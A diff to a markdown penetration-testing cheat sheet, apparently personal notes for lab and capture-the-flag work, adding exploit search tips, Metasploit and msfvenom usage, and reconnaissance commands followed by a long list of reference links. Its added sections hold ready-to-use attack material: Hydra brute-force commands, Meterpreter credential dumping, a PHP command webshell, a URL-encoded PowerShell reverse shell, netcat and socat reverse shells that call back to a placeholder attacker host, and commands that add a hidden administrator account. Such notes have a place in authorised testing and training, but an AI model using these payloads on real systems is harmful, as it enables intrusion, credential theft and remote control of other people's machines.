@@ -23,6 +23,14 @@ Standard penetration testing methodology:
 - [MITRE ATT&CK](https://attack.mitre.org/) - Adversarial tactics and techniques
 - [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) - Original kill chain methodology
 
+## Searching
+
+- Shodan.io: https://www.shodan.io/dashboard?language=en
+    - https://www.shodan.io/search/examples
+- Censys
+    - https://docs.censys.com/docs/ls-introductory-use-cases#/
+- Advanced Search Operators: https://github.com/cipher387/Advanced-search-operators-list?tab=readme-ov-file#socialmedia
+
 # 🔍 Host Discovery
 
 Host discovery is the first phase of network reconnaissance, focused on identifying live hosts within a target network.
@@ -392,7 +400,6 @@ sudo nmap -sU -Pn -n -p 500 --script=ike-version <TARGET>
 ## 🌐 DNS
 
 - DNSDumpster: https://dnsdumpster.com/
-- Shodan.io: https://www.shodan.io/dashboard?language=en
 
 ```bash
 whois <TARGET>
@@ -475,10 +482,13 @@ wpscan --url http://<USER>/ --enumerate u
 2025-08-19 18:26:03 -- wpscan --url http://<TARGET>/ --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --password-attack wp-login
 ```
 
-### 🔤 URL Encode String
+### 🔤 URL Encode/Decode String
 
 ```bash
-echo '<COMMAND>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))'
+# Encode
+echo '<DATA>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))'
+# Decode
+echo '<DATA>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read()))'
 ```
 
 ### 🌐 Interacting with Web Servers using cURL
@@ -500,44 +510,39 @@ curl -o- 'http://<TARGET>/uploads/shell.phtml?cmd=ls%20-la'
 
 The exploitation phase focuses on gaining initial access to target systems through various attack vectors.
 
+- https://www.exploit-db.com/
+- https://www.rapid7.com/db/
+- https://github.com/search.html
+    - `CVE-2022-22965 in:file`
+    - `"remote code execution" in:file language:python`
+    - `wordpress "authenticated" "rce" in:name in:description language:php stars:>=10`
+    - `"Apache Struts" RCE in:file language:ruby`
+    - `"proof of concept" "poc" in:name language:go`
+    - `"buffer overflow" "exploit" in:file`
+- `searchsploit`
+```bash
+# Update Searchsploit
+searchsploit --update
+# Search
+searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
+```
+- https://nvd.nist.gov/vuln/search#/nvd/home
+
 ## 💥 Brute-Forcing
 
 ### 🔨 Brute-Forcing Web & SSH Logins with Hydra
 ```bash
 # Brute-force a web login form
-hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -t 16 -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
 # Brute-force a Wordpress login form with a complex request string
-hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username' -V
+hydra -t 16 -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username' -V
 
-# Brute-force an SSH login for a specific user
+# Brute-force an SSH login for a specific user; -t 4 is recommended for SSH
 hydra -t 4 -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>:<PORT>
 ```
 
 ## 🎯 Metasploit / Meterpreter
-
-### 🔍 Search (for too many results)
-
-```bash
-searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
-```
-
-### 📊 Survey
-
-```bash
-sysinfo
-getuid
-getpid
-ipconfig
-ps
-run winenum
-run post/windows/gather/checkvm
-run post/windows/gather/enum_applications
-run post/windows/gather/enum_logged_on_users
-# --- Privilege Escalation & Credential Gathering ---
-run post/windows/gather/smart_hashdump
-run post/multi/recon/local_exploit_suggester
-```
 
 ### 🎯 Finding and Executing Exploits
 ```bash
@@ -555,9 +560,144 @@ set payload php/meterpreter/bind_tcp
 run
 ```
 
+### 📊 Survey
+
+```bash
+sysinfo
+getuid
+getpid
+ipconfig
+ps
+
+search -f flag.txt
+search -f user.txt
+search -f root.txt
+# REMEMBER: quyoting and double slashes 
+cat "C:\\Programs and Files (x86)\\"
+
+hashdump  # CrackStation
+# --- kiwi (like mimikatz) ---
+load kiwi
+creds_all
+
+# === WINDOWS ===
+run winenum
+run post/windows/gather/checkvm
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_shares
+# --- Privilege Escalation & Credential Gathering ---
+run post/windows/gather/smart_hashdump
+run post/multi/recon/local_exploit_suggester
+```
+
+### DB for Targets
+
+```bash
+# Check database status from within msfconsole
+db_status
+
+# Manage workspaces
+workspace
+workspace -a <name>
+workspace -d <name>
+workspace <name>
+workspace -h
+
+# Database Backend Commands
+db_connect
+db_disconnect
+db_export
+db_import
+db_nmap <nmap_options> <target>
+db_rebuild_cache
+db_remove
+db_save
+db_status
+hosts
+loot
+notes
+services
+vulns
+workspace
+
+# Common tasks in Metasploit
+use <module/path>
+show options
+run
+exploit
+
+# Using database hosts for a module
+hosts -R
+services -S <search_term>
+```
+
+### Msfvenom
+
+- **Note:** stageless payloads user underscores in the name '_' like `shell_reverse_tcp`
+
+```bash
+# Listener for reverse callbacks
+use exploit/multi/handler
+
+set payload <PAYLOAD>  # should match msfvenom
+set lhost <LISTEN_IP>
+set lport <LISTEN_PORT>
+
+# Msfvenom commands
+msfvenom -l payloads
+msfvenom --list formats
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<TARGET> -f raw -e php/base64  # NOTE: need to add <?php ?> tags to file
+msfvenom -p php/reverse_php LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > reverse_shell.php  # NOTE: need to add <?php ?> tags to file
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f elf > rev_shell.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f exe > rev_shell.exe
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f asp > rev_shell.asp
+msfvenom -p cmd/unix/reverse_python LHOST=<TARGET> LPORT=<TARGET_PORT> -f raw > rev_shell.py
+```
+### Scans
+
+```bash
+# === Discovery Scans ===
+# ARP Sweep
+auxiliary/scanner/discovery/arp_sweep
+# UDP Sweep
+auxiliary/scanner/discovery/udp_sweep
+# TCP Port Scan
+auxiliary/scanner/portscan/tcp
+
+# === Enumeration Scans ===
+# SMB User Enumeration
+auxiliary/scanner/smb/smb_enumusers
+# SMB Share Enumeration
+auxiliary/scanner/smb/smb_enumshares
+# SMB Version Enumeration
+auxiliary/scanner/smb/smb_version
+# FTP Version
+auxiliary/scanner/ftp/ftp_version
+# SNMP Enumeration
+auxiliary/scanner/snmp/snmp_enum
+# HTTP Version
+auxiliary/scanner/http/http_version
+
+# === Vulnerability Checks ===
+# EternalBlue MS17-010 Vulnerability Check
+auxiliary/scanner/smb/smb_ms17_010
+# HTTP Options
+auxiliary/scanner/http/http_options
+```
+
 ## 🐚 Reverse & Bind Shells
 
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+- https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
+
 ### 💻 Shell One-Liners
+
+- typically `sudo` is required for ports below 1024
+- RECOMMENDED: 80, 443 or 53
+    - likely to bypass firewalls
 
 #### 👂 LISTENER
 
@@ -578,15 +718,19 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI_IP> <PORT> > /tmp/f
 ```
 
-### 🐘 PHP Web Shells
+### 🐘 PHP Webshell
+
+`/usr/share/webshells`
+- https://github.com/payloadbox/command-injection-payload-list
 
 #### 📤 Upload command executor
 ```php
+// cmd.php
 <?php system($_GET['cmd']); ?>
 ```
 #### ▶️ Run commands
 ```bash
-curl http://<TARGET>/cmd.php?cmd=echo 'hi there'
+curl http://<TARGET>/cmd.php?cmd=ls
 ```
 
 ---
@@ -600,47 +744,207 @@ nc -lvnp 54321
 **MAKE SURE NETCAT IS ON TARGET**
 ```php
 <?php
-  $cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 54321 > /tmp/f";
+  $cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LISTEN_IP> <PORT> > /tmp/f";
   system($cmd);
 ?>
+```
+
+### Windows Webshell
+
+```powershell
+# REPLACE <IP> and <PORT>
+powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
 ```
 
 # 🛠️ Post-Exploitation
 
 Post-exploitation focuses on maintaining access, gathering information, escalating privileges, and preparing for lateral movement.
 
-## ⬆️ Shell Upgrades
+## ⬆️ Shell Upgrades (Stabilization)
+
+### Python Method
 
 ```bash
-# Meterpreter
-execute -f 'python -c "import pty; pty.spawn(\"/bin/bash\")"' -i -t
+# === STEP 1 ===
 
 # Upgrade a simple shell to a more interactive PTY
 python2 -c 'import pty; pty.spawn("/bin/sh")'
 python2 -c 'import pty; pty.spawn("/bin/bash")'
+
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+# Meterpreter
+execute -f 'python -c "import pty; pty.spawn(\"/bin/bash\")"' -i -t
+
+# === STEP 2 ===
+
+# Interpret terminal escape codes
+export TERM=xterm
+
+# === STEP 3 ===
+
+CTRL+Z (background)
+
 # Stabilize a shell from terminal escape commands
 stty raw -echo; fg
+
+# === SHELL DIES ===
+reset  # to re-enable disabled echo
 ```
 
-### 🔧 Socat Shell Upgrade
+#### Resize Terminal
 
 ```bash
-# LOCAL: download and serve static socat
+# RUN THIS OUTSIDE of remote shell
+# THEN run the output inside the remote shell
+stty size | awk '{printf "stty rows %s cols %s\n", $1, $2}'
+# or
+stty -a | grep -o "rows [0-9]*; columns [0-9]*" | awk '{print "stty", $2, $4}'
+```
+
+### `rlwrap` Method
+
+```bash
+# Must wrap listener beforehand
+rlwrap nc -lvnp <PORT>
+```
+
+### 🔧 Socat Method
+
+- https://github.com/andrew-d/static-binaries/tree/master/binaries
+
+```bash
+#====================================================================
+# STEP 1: ATTACKER - One-Time Setup (Get & Serve socat)
+#====================================================================
 cd /tmp
-wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
-ip a ; python3 -m http.server 8000
+# Download static Linux binary if needed
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x88_64/socat
+# (Assume you have socat.exe in the same directory for Windows targets)
+
+# Get your IP and serve the directory on port 80
+ip a ; sudo python3 -m http.server 80
+
+#====================================================================
+# A) STANDARD (Unencrypted) SHELLS
+#====================================================================
+
+#--------------------------------------------------------------------
+# LINUX TARGET (Fully Stable TTY Shell)
+#--------------------------------------------------------------------
+
+# ATTACKER (Listen):
 socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
 
-# REMOTE: Use socat to connect back to the listener and spawn a shell
-curl -o socat http://<KALI_IP>:8000/socat
-chmod +x socat
-./socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane
+# LINUX TARGET (Connect Back):
+curl http://<KALI_IP>:80/socat -o /tmp/socat
+chmod +x /tmp/socat
+/tmp/socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane
+
+#--------------------------------------------------------------------
+# WINDOWS TARGET (Simple Shell)
+#--------------------------------------------------------------------
+
+# ATTACKER (Listen):
+socat tcp-listen:<PORT> -
+
+# WINDOWS TARGET (Connect Back):
+Invoke-WebRequest -uri http://<KALI_IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+C:\\Windows\temp\socat.exe TCP:<KALI_IP>:<PORT> EXEC:powershell.exe,pipes
+
+
+#====================================================================
+# B) OPENSSL (Encrypted) SHELLS
+#====================================================================
+
+#--------------------------------------------------------------------
+# ATTACKER: One-Time Setup (Generate Certificate)
+#--------------------------------------------------------------------
+# Generate key and cert (fill info randomly or leave blank)
+openssl req -x509 -newkey rsa:2048 -keyout shell.key -out shell.crt -days 365 -nodes -batch -subj "/"
+# Combine into a single PEM file for socat
+cat shell.key shell.crt > shell.pem
+
+#--------------------------------------------------------------------
+# LINUX TARGET (Encrypted Stable TTY Shell)
+#--------------------------------------------------------------------
+
+# ATTACKER (Listen):
+socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 
+
+# LINUX TARGET (Connect Back):
+# (Upload socat first, same as standard shell)
+/tmp/socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:<KALI_IP>:<PORT>,verify=0 
+
+#--------------------------------------------------------------------
+# WINDOWS TARGET (Encrypted Simple Shell)
+#--------------------------------------------------------------------
+
+# ATTACKER (Listen):
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+# WINDOWS TARGET (Connect Back):
+# (Upload socat.exe first, same as standard shell)
+C:\\Windows\temp\socat.exe EXEC:powershell.exe,pipes OPENSSL:<KALI_IP>:<PORT>,verify=0
+```
+
+## Netcat and PowerShell shells
+
+```bash
+# === REVERSE SHELL ===
+
+# ATTACKER (Listen):
+nc -lvnp <PORT>
+
+# LINUX TARGET (Connect Back):
+nc <ATTACKER_IP> <PORT> -e /bin/bash
+
+# WINDOWS TARGET (Connect Back):
+# /usr/share/windows-resources/binaries/nc.exe
+nc.exe <ATTACKER_IP> <PORT> -e cmd.exe
+
+# === BIND SHELL ===
+
+# LINUX TARGET (Listen):
+nc -lvnp <PORT> -e /bin/bash
+
+# WINDOWS TARGET (Listen):
+nc.exe -lvnp <PORT> -e cmd.exe
+
+# ATTACKER (Connect):
+nc <TARGET_IP> <PORT>
+
+# === NETCAT SHELLS (Modern Linux, without -e flag) ===
+
+# REVERSE SHELL
+# ATTACKER (Listen):
+nc -lvnp <PORT>
+
+# LINUX TARGET (Connect Back):
+mkfifo /tmp/f; nc <ATTACKER_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+# --- BIND SHELL ---
+
+# LINUX TARGET (Listen):
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+# ATTACKER (Connect):
+nc <TARGET_IP> <PORT>
+
+# --- POWERSHELL REVERSE SHELL (Windows Only) ---
+
+# ATTACKER (Listen):
+nc -lvnp <PORT>
+
+# WINDOWS TARGET (Connect Back):
+# (Execute this one-liner in a cmd.exe or powershell prompt)
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ## 🐧 Linux Survey
+
+- https://gtfobins.github.io/
 
 ```bash
 #!/bin/bash
@@ -787,7 +1091,6 @@ chmod +x PwnKit
 ### 🔗 Connecting and Transferring Files
 ```bash
 # SSH into a target using a password with sshpass (non-interactive)
-sudo apt-get install -y sshpass
 sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>
 
 # SSH into a target using a private key identity file
@@ -841,6 +1144,87 @@ db.<COLLECTION>.find().pretty()
 # Generate a SHA512crypt password hash to change password
 openssl passwd -6 <PASSWORD>
 db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "<HASH>" } });
+```
+
+
+## RDP via xfreerdp
+
+```bash
+xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>'
+```
+
+## Linux Commands
+
+### `strings` in Python
+
+```bash
+python3 -c "import re, sys; [print(m.decode()) for m in re.findall(b'[ -~]{4,}', open(sys.argv[1], 'rb').read())]" <FILE>
+```
+## Windows Commands
+
+```powershell
+# Survey
+set
+ver
+systeminfo
+driverquery
+
+ipconfig /all
+nbtstat -n
+netstat -anob
+
+dir /a
+tree
+type
+more
+tasklist
+
+ping
+tracert
+nslookup
+
+# Add User w/ admin privs
+net user <USERNAME> <PASSWORD> /add
+net localgroup administrators <USERNAME> /add
+```
+
+## PowerShell
+
+```powershell
+###
+
+Get-Content
+Set-Location
+Get-Command
+Get-Command -CommandType "Function"
+Get-Help
+Get-Alias
+Find-Module
+Install-Module
+Get-ChildItem
+Remove-Item
+Copy-Item
+Move-Item
+
+# Piping
+Get-ChildItem | Sort-Object Length
+Where-Object
+Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"
+Get-ChildItem | Where-Object -Property "Name" -like "ship*"  
+Get-ChildItem | Select-Object Name,Length 
+Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1
+Select-String -Path ".\captain-hat.txt" -Pattern "hat"
+
+# Zesty details
+Get-ComputerInfo
+Get-LocalUser
+Get-NetIPConfiguration
+Get-Process
+Get-Service
+Get-NetTCPConnection
+Get-FileHash
+Invoke-Command
+Invoke-Command -ComputerName Server01 -Credential Domain01\User01 -ScriptBlock { Get-Culture }
 ```
 
 ## 🌱 Living Off the Land
@@ -980,3 +1364,111 @@ echo "    deactivate"
 *   **General Shortlist:** `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
 *   **Default Credentials:** `/usr/share/seclists/Usernames/cirt-default-usernames.txt`
 *   **Common Names:** `/usr/share/seclists/Usernames/Names/names.txt`
+
+## Report Templates
+
+- [Cybersecurity Style Guide V1.1 - Bishop-Fox-Cybersecurity-Style-Guide.pdf](https://s3.us-east-2.amazonaws.com/s3.bishopfox.com/prod-1437/Documents/Guides/Bishop-Fox-Cybersecurity-Style-Guide.pdf)
+- [Ghostwriter: The SpecterOps project management and reporting engine](https://github.com/GhostManager/Ghostwriter)
+
+# 🛠️ **The Docs**
+
+## ⚙️ Ansible
+
+- [Ansible Configuration Settings (environment variables)](https://docs.ansible.com/ansible/latest/reference_appendices/config.html)
+- [Jinja Documentation](https://jinja.palletsprojects.com/)
+- [Jinja Template Designed Documentation](https://jinja.palletsprojects.com/templates/)
+
+## 📦 Vagrant
+
+- [Vagrant Docs](https://www.vagrantup.com/docs)
+- [Vagrant Boxes](https://app.vagrantup.com/boxes/search)
+
+## 🧰 Packer
+
+- [Windows Templates for Packer](https://github.com/StefanScherer/packer-windows)  
+  - Windows 11, 10, Server 2022/2019/2016, also with Docker
+- [Debugging Packer](https://www.packer.io/docs/debugging)
+- [Contextual Variables (in the build)](https://www.packer.io/docs/templates/hcl_templates/contextual-variables)
+- [Path Variables](https://www.packer.io/docs/templates/hcl_templates/path-variables)
+- [Template Engine](https://www.packer.io/docs/templates/legacy_json_templates/engine)
+- [Packer Env Vars](https://www.packer.io/docs/configure)
+
+## 🐳 Docker
+
+- [Docker Docs](https://docs.docker.com/engine/)
+- [Docker Hub](https://hub.docker.com/search?type=image)
+- [(Docker) Dockerfile Reference](https://docs.docker.com/engine/reference/builder/)
+- [(Docker) Compose Specification](https://docs.docker.com/compose/compose-file/)
+
+## 🐍 Python
+
+- [Python3 Docs](https://docs.python.org/3/index.html)
+- [Python3 Default Exceptions](https://docs.python.org/3/library/exceptions.html#exception-hierarchy)
+- [Python Code Search](https://www.programcreek.com/python/)
+- [Sphinx (Python3) Docstring](https://sphinx-rtd-tutorial.readthedocs.io/en/latest/docstrings.html)
+- [(eBook) Learn Python the Hard Way](https://learnpythonthehardway.org/python3/)
+- [Selenium w/ Python Docs](https://selenium-python.readthedocs.io/)
+- [Selenium WebDriver](https://www.selenium.dev/documentation/en/webdriver/)
+
+## 📝 Cheatsheets / Quick References
+
+- [Bash cheatsheet](https://devhints.io/bash) | [Bash Colors](https://www.shellhacks.com/bash-colors/)
+- [Vim cheatsheet](https://devhints.io/vim) | [Vim scripting cheatsheet](https://devhints.io/vimscript)
+- [Tmux Cheat Sheet & Quick Reference](https://tmuxcheatsheet.com/)
+- [Regex Tester and Debugger (Online)](https://www.regextester.com/)
+- [SANS Cyber Security Posters/Cheatsheets](https://www.sans.org/posters/?msc=securityresourceslp)
+
+## 🌐 Good Stuff™
+
+- [BROWSERS: WHICH ONE TO CHOOSE?](https://magusz.neocities.org/browsers.html)
+- [Running Windows 10 on Linux using KVM with VGA Passthrough - Heiko's Blog](https://heiko-sieger.info/running-windows-10-on-linux-using-kvm-with-vga-passthrough/#Part_1_Hardware_Requirements)
+- [Arch boot process - ArchWiki](https://wiki.archlinux.org/index.php/Arch_boot_process)
+
+## 🔒 Security
+
+- [How to Stay Up-to-Date on Security Trends](https://securityintelligence.com/how-to-stay-up-to-date-on-security-trends/)
+- [Networking Cheatsheets](http://packetlife.net/library/cheat-sheets/)
+- [HTML CheatSheet](http://htmlcheatsheet.com/)
+- [Krebs on Security](http://krebsonsecurity.com/)
+- [NetSec Focus](https://mm.netsecfocus.com/nsf/channels/town-square)
+- [Security Week](https://www.securityweek.com/)
+
+- [ArchWiki](https://wiki.archlinux.org/)
+- [Arch Package Search](https://archlinux.org/packages/)
+- [Manjaro - How to provide good info](https://forum.manjaro.org/t/how-to-provide-good-information/874)
+
+- [KeePassXC Docs](https://keepassxc.org/docs/KeePassXC_GettingStarted.html#_overview)
+- [i3 Docs](https://i3wm.org/docs/userguide.html)
+- [Spaceship-Prompt Options](https://spaceship-prompt.sh/options/)
+- [neovim (Nvim) Docs](https://neovim.io/doc/user/)
+- [Torrenting Blocklists](https://greycoder.com/the-best-blocklist-for-torrents/)
+- [Borg Backup Docs](https://borgbackup.readthedocs.io/en/stable/)
+- [GRUB Manual](https://www.gnu.org/software/grub/manual/grub/html_node/Simple-configuration.html)
+- [Writing a proper GitHub issue](https://medium.com/nyc-planning-digital/writing-a-proper-github-issue-97427d62a20)
+- [Searching code - GitHub Docs](https://docs.github.com/en/search-github/searching-on-github/searching-code)
+
+- [Windows Post-Exploitation Resources](https://github.com/emilyanncr/Windows-Post-Exploitation)
+- [(Windows Survey) Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md)
+- [Pentesting: Tricks for penetration testing](https://github.com/kmkz/Pentesting)
+- [Awesome tools to exploit Windows!](https://github.com/Hack-with-Github/Windows)
+- [Living Off The Land Binaries, Scripts and Libraries](https://lolbas-project.github.io/#)
+- [File Transfers Cheat Sheet by fred](https://cheatography.com/fred/cheat-sheets/file-transfers/)
+- [Public PenTest Report Examples](https://pentestreports.com/reports/)
+- [MITRE ATT&CK®](https://attack.mitre.org/)
+- [Registry RegRipper](https://resources.infosecinstitute.com/topic/registry-forensics-regripper-command-line-linux/)
+- [OSCP-Exam-Report-Template-Markdown](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)
+- [SecLists: The security tester's companion](https://github.com/danielmiessler/SecLists)
+- [Other Big References - HackTricks](https://book.hacktricks.xyz/todo/references)
+- [A guide for windows penetration testing - Rogue Security](https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/)
+- [HackTricks - HackTricks](https://book.hacktricks.xyz/welcome/readme)
+- [Passwords - SkullSecurity](https://wiki.skullsecurity.org/index.php/Passwords)
+- [NTLM: How does the authentication protocol work? - IONOS](https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/)
+- [CertCube Labs - Blog On Advance InfoSec Concepts](https://blog.certcube.com/)
+- [Impacket: Python classes for working with network protocols](https://github.com/SecureAuthCorp/impacket)
+- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/PEASS-ng)
+- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
+- [How to convert flat raw disk image to vmdk for virtualbox or vmplayer? - Stack Overflow](https://stackoverflow.com/questions/454899/how-to-convert-flat-raw-disk-image-to-vmdk-for-virtualbox-or-vmplayer)
+- [How to extract forensic artifacts from pagefile.sys? | Andrea Fortuna](https://andreafortuna.org/2019/04/17/how-to-extract-forensic-artifacts-from-pagefile-sys/)
+- [windows-binary-tools: Useful binaries for Windows](https://github.com/arizvisa/windows-binary-tools)
+- [Techniques - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/enterprise/)
+- [Dr Josh Stroschein - YouTube](https://www.youtube.com/@jstrosch/videos)
